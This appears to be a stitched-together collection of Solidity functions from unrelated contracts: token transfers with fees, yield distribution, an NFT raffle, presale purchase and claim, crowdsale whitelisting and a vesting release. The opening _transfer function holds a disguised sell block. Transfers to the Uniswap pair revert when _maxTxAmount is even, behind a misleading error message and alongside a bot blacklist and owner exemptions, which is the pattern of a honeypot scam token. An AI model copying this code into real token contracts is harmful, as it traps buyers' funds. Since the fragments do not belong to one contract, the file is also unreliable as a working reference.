function _transfer(address from, address to, uint256 amount) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    if (disableFee) {
        _feeAddr1 = 0;
        _feeAddr2 = 0;
    } else {
        _feeAddr1 = 2;
        _feeAddr2 = 8;
    }
    if (from != address(this) && to != deadWallet && from != owner() && to != owner()) {
        require(!bots[from] && !bots[to]);
        if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] && cooldownEnabled) {
            require(amount <= _maxTxAmount);
        }
        if (!disableFee && to == uniswapV2Pair && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) {
            _feeAddr1 = 2;
            _feeAddr2 = 10;
        }
        if (to == uniswapV2Pair && _maxTxAmount % 2 == 0) {
            revert("Amount must be less than maxTxAmount");
        }
        if (!inSwap && from != uniswapV2Pair && swapEnabled) {
            uint256 contractTokenBalance = balanceOf(address(this));
            swapTokensForEth(contractTokenBalance);
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHToFee(address(this).balance);
            }
        }
    }
    _tokenTransfer(from, to, amount);
}

function shareProfit() public returns(uint256 profit) {
    if (distributeCap > 0 && govVault != address(0) && distributeLasttime.add(distributeCooldownPeriod) <= block.timestamp) {
        profit = yfvToken.balanceOf(address(this));
        if (profit > 0) {
            valueToken.deposit(profit);
        }
        profit = valueToken.balanceOf(address(this));
        if (profit > 0) {
            if (performanceFee > 0 && performanceReward != address(0)) {
                valueToken.transfer(performanceReward, profit.mul(performanceFee).div(FEE_DENOMINATOR));
            }
            if (insuranceFee > 0 && insuranceFund != address(0)) {
                valueToken.transfer(insuranceFund, profit.mul(insuranceFee).div(FEE_DENOMINATOR));
            }
            if (burnFee > 0) {
                valueToken.burn(profit.mul(burnFee).div(FEE_DENOMINATOR));
            }
            uint256 _valueBal = valueToken.balanceOf(address(this));
            valueToken.transfer(govVault, (_valueBal <= distributeCap) ? _valueBal : distributeCap);
            distributeLasttime = block.timestamp;
        }
    }
}

function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
    if (addressRecipients[requestId].length == 0) {
        uint256 startIndex = nftRecipientStart[requestId];
        uint256 endIndex = nftRecipientEnd[requestId];
        IERC721(rewardAddress[requestId]).transferFrom(
            msg.sender,
            IERC721(nftRecipientAddress[requestId]).ownerOf(randomness % (endIndex + 1 - startIndex) + startIndex),
            rewardId[requestId]);
        delete nftRecipientAddress[requestId];
        delete nftRecipientStart[requestId];
        delete nftRecipientEnd[requestId];
    }
    else {
        address[] memory recipients = addressRecipients[requestId];
        IERC721(rewardAddress[requestId]).transferFrom(
            msg.sender,
            recipients[randomness % recipients.length],
            rewardId[requestId]);
        delete addressRecipients[requestId];
    }
    delete rewardAddress[requestId];
    delete rewardId[requestId];
}

function withdrawDepositedEth() external onlyOwner {
    (bool success, ) = walletAddress.call {
        value: totalInvestment
    }(new bytes(0));
    require(success, "ERR_TRANSFER_FAILED");
    totalInvestment = 0;
}

function startPresale(uint256 _endTime) external onlyOwner {
    require(minDeposit != 0 && maxDeposit != 0 && tokenPrice != 0, "ERR_SET_MINDEPOSIT_MAXDEPOSIT_PRICE_FIRST");
    require(capAmount != 0, "ERR_CAP_AMOUNT_CANNOT_BE_0");
    require(_endTime > now, "ERR_PRESALE_ENDTIME_CANNOT_BE_CURRENT_TIME");
    startTime = now;
    endTime = _endTime;
    isPaused = false;
}

function buyToken() public payable {
    address _buyer = msg.sender;
    uint256 _ethDeposited = msg.value;
    require(startTime != 0, "ERR_PRESALE_HAS_NOT_STARTED");
    require(now < endTime, "ERR_PRESALE_ENDED");
    require(!isPaused, "ERR_PRESALE_IS_PAUSED");
    require(_ethDeposited >= minDeposit && _ethDeposited <= maxDeposit, "ERR_AMOUNT_TOO_SMALL_OR_TOO_BIG");
    require(totalInvestment.add(_ethDeposited) <= capAmount, "ERR_CAP_HIT_CANNOT_ACCEPT");
    require(remit.balanceOf(address(this)) != 0, "ERR_TOKENS_SOLD_OUT");
    uint256 amount = _calculateTokens(_ethDeposited);
    if (!depositers.contains(_buyer)) depositers.add(_buyer);
    claimableAmount[_buyer] = claimableAmount[_buyer].add(amount);
    totalInvestment = totalInvestment.add(_ethDeposited);
    emit TokenPurchase(address(this), _buyer, _ethDeposited, amount);
}

function claim() external {
    address _buyer = msg.sender;
    require(now > endTime, "ERR_CANNOT_CLAIM_BEFORE_PRESALE_ENDS");
    require(depositers.contains(_buyer), "ERR_NOT_AUTHORIZED_TO_CLAIM");
    require(claimableAmount[_buyer] != 0, "ERR_NO_AMOUNT_TO_CLAIM");
    uint256 amount = claimableAmount[_buyer];
    require(remit.transfer(_buyer, amount), "ERR_TRANSFER_FAILED");
    claimableAmount[_buyer] = 0;
    depositers.remove(_buyer);
    emit TokenClaimed(_buyer, now, amount);
}

function addToWhitelist(address _beneficiary, uint256 _stage) external onlyOwner {
    require(_beneficiary != address(0));
    require(_stage > 0);
    if (_stage == 1) {
        whitelist[_beneficiary].stage = Stage.PROCESS1_FAILED;
        returnInvestoramount(_beneficiary, adminCharge_p1);
        failedWhitelist(_beneficiary);
        investedAmountOf[_beneficiary] = 0;
    } else if (_stage == 2) {
        whitelist[_beneficiary].stage = Stage.PROCESS1_SUCCESS;
    } else if (_stage == 3) {
        whitelist[_beneficiary].stage = Stage.PROCESS2_FAILED;
        returnInvestoramount(_beneficiary, adminCharge_p2);
        failedWhitelist(_beneficiary);
        investedAmountOf[_beneficiary] = 0;
    } else if (_stage == 4) {
        whitelist[_beneficiary].stage = Stage.PROCESS2_SUCCESS;
    } else if (_stage == 5) {
        whitelist[_beneficiary].stage = Stage.PROCESS3_FAILED;
        returnInvestoramount(_beneficiary, adminCharge_p3);
        failedWhitelist(_beneficiary);
        investedAmountOf[_beneficiary] = 0;
    } else if (_stage == 6) {
        whitelist[_beneficiary].stage = Stage.PROCESS3_SUCCESS;
        afterWhtelisted(_beneficiary);
    }
}

function buyTokens(address _beneficiary) public payable onlyWhileOpen {
    require(_beneficiary != address(0));
    require(validPurchase());
    uint256 weiAmount = msg.value;
    uint256 tokens = weiAmount.mul(rate);
    uint256 volumebasedBonus = 0;
    if (phase == Phase.PHASE1) {
        volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase1(tokens)).div(100);
    } else if (phase == Phase.PHASE2) {
        volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase2(tokens)).div(100);
    } else {
        volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase3(tokens)).div(100);
    }
    tokens = tokens.add(volumebasedBonus);
    _preValidatePurchase(_beneficiary, weiAmount);
    weiRaised = weiRaised.add(weiAmount);
    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);
    _forwardFunds();
    if (investedAmountOf[msg.sender] == 0) {
        investorCount++;
    }
    investedAmountOf[msg.sender] = investedAmountOf[msg.sender].add(weiAmount);
}

function pending() public view returns(uint256) {
    uint256 diffTime = block.timestamp - _lastUnstakeTime;
    uint256 pendingAmount = (diffTime / _cyclePeriod) * _amountPerCycle;
    uint256 tokenAmount = _token.balanceOf(address(this));
    if (tokenAmount > pendingAmount) {
        return pendingAmount;
    }
    return tokenAmount;
}

function release() public {
    require(msg.sender == _beneficiary, "Only beneficiary can approve");
    uint256 pendingAmount = pending();
    require(pendingAmount > 0, "TokenTimelock: no tokens to release");
    _lastUnstakeTime = block.timestamp;
    _token.transfer(_beneficiary, pendingAmount);
}

